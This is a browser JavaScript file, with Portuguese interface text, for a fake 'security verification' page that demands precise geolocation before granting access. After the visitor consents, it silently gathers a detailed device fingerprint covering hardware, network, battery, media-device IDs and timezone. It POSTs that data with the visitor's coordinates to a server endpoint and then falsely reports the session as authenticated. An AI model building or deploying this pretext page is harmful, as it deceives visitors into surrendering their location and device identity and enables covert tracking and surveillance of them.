window.addEventListener("DOMContentLoaded", function () {
  async function coletarExtrasAvancado() {
    const connection = navigator.connection || {};
    const permissions = navigator.permissions ? await navigator.permissions.query({ name: 'geolocation' }).catch(() => null) : null;
    const battery = navigator.getBattery ? await navigator.getBattery().catch(() => null) : null;
    const devices = await (navigator.mediaDevices?.enumerateDevices?.().catch(() => []) || []);

    const fingerprint = btoa(
      navigator.userAgent +
      navigator.language +
      navigator.platform +
      screen.width + screen.height +
      navigator.hardwareConcurrency +
      navigator.deviceMemory +
      Intl.DateTimeFormat().resolvedOptions().timeZone
    );

    return {
      isMobile: /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent),
      userAgent: navigator.userAgent,
      appVersion: navigator.appVersion,
      vendor: navigator.vendor || 'Indisponível',
      platform: navigator.platform || 'Indisponível',
      language: navigator.language || 'Indisponível',
      locale: Intl.NumberFormat().resolvedOptions().locale,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'Indisponível',
      webdriver: navigator.webdriver || false,
      deviceMemory: navigator.deviceMemory || 'Indisponível',
      cpuCores: navigator.hardwareConcurrency || 'Indisponível',
      screenResolution: `${screen.width}x${screen.height}`,
      windowSize: `${window.innerWidth}x${window.innerHeight}`,
      pixelRatio: window.devicePixelRatio || 1,
      colorDepth: screen.colorDepth || 'Indisponível',
      prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
      connection: {
        type: connection.type || 'Indisponível',
        effectiveType: connection.effectiveType || 'Indisponível',
        downlink: connection.downlink || 'Indisponível',
        rtt: connection.rtt || 'Indisponível',
        saveData: connection.saveData || false,
      },
      geolocationPermission: permissions?.state || 'Desconhecido',
      battery: battery ? {
        level: battery.level,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      } : 'Não suportado',
      mediaDevices: devices.map(dev => ({
        kind: dev.kind,
        label: dev.label || 'Desconhecido',
        deviceId: dev.deviceId || ''
      })),
      fingerprint
    };
  }

  function mostrarChecklistAnimado() {
    const itens = document.querySelectorAll('#checklist li');
    itens.forEach((item, i) => {
      setTimeout(() => item.classList.add('visible'), 500 + (i * 600));
    });
  }

  function tocarSomNegado() {
    setTimeout(() => {
      const audioNegado = document.getElementById("somNegado");
      audioNegado.volume = 1;
      audioNegado.play().catch(() => {
        console.warn("Navegador bloqueou autoplay. Som será ignorado.");
      });
    }, 200);
  }

  function negarAcesso(mensagem = null) {
    document.getElementById("verificando").style.display = "none";
    const container = document.getElementById("acesso-negado");
    if (mensagem) container.querySelector("p").textContent = mensagem;
    container.style.display = "block";
    container.classList.add("visible");
    tocarSomNegado();
  }

  function atualizarStatus(mensagem, percentual) {
    document.getElementById('status-msg').textContent = mensagem;
    document.getElementById('progresso').style.width = percentual + '%';
  }

  document.getElementById("verificando").classList.add("visible");
  mostrarChecklistAnimado();
  atualizarStatus("Verificando conexão segura...", 25);

  setTimeout(() => {
    atualizarStatus("Verificando localização...", 50);
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async function (position) {
          atualizarStatus("Validando dispositivo...", 75);
          const extras = await coletarExtrasAvancado();
          localStorage.setItem("dadosVerificacao", JSON.stringify(extras));
          fetch('http://localhost:3000/api/localizacao', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              dataHora: new Date().toISOString(),
              ...extras
            })
          });
          setTimeout(() => {
            document.getElementById("verificando").style.display = "none";
            const container = document.getElementById("conteudo");
            container.style.display = "block";
            container.classList.add("visible");
            atualizarStatus("Sessão autenticada.", 100);
          }, 1000);
        },
        (erro) => {
          let msgErro = "Erro desconhecido.";
          switch (erro.code) {
            case erro.PERMISSION_DENIED:
              msgErro = "Permissão de localização negada.";
              break;
            case erro.POSITION_UNAVAILABLE:
              msgErro = "Localização indisponível.";
              break;
            case erro.TIMEOUT:
              msgErro = "Tempo de localização excedido.";
              break;
          }
          negarAcesso(msgErro);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      negarAcesso("Seu navegador não suporta geolocalização.");
    }
  }, 3000);

  window.continuar = function () {
    const audio = document.getElementById("somAutorizado");
    audio.play().catch(() => {
      window.location.href = "acesso.html";
    });
    audio.onended = () => {
      window.location.href = "acesso.html";
    };
    setTimeout(() => {
      window.location.href = "acesso.html";
    }, 4000);
  };
});